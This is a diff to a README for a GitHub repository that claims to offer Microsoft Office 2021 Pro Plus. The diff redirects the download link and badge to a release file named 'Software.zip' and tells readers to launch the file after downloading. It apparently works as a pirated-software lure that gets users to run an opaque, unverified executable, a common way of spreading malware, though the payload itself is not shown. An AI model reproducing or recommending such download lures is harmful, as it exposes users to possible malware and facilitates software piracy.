@@ -15,7 +15,7 @@ Welcome to the "Microsoft-Office-2021-Pro-Plus" repository, your one-stop destin
 
 ### How to Get Started:
 
-To download Microsoft Office 2021 Pro Plus, click [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 
+To download Microsoft Office 2021 Pro Plus, click [here](https://github.com/satriaprana/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip). 
 
 🚀 **Launch the file after downloading to install Microsoft Office 2021 Pro Plus and unleash your productivity potential!**
 
@@ -42,7 +42,7 @@ To download Microsoft Office 2021 Pro Plus, click [here](https://github.com/cli/
 
 ### Don't Forget to Visit Our GitHub Repository:
 
-[![Download Microsoft Office](https://img.shields.io/badge/Download-Microsoft%20Office-9cf)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Microsoft Office](https://github.com/satriaprana/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip%20Office-9cf)](https://github.com/satriaprana/Microsoft-Office-2021-Pro-Plus/releases/download/v1.0/Software.zip)
 
 🌟 **Visit the link above to access the latest version of Microsoft Office 2021 Pro Plus.**
 
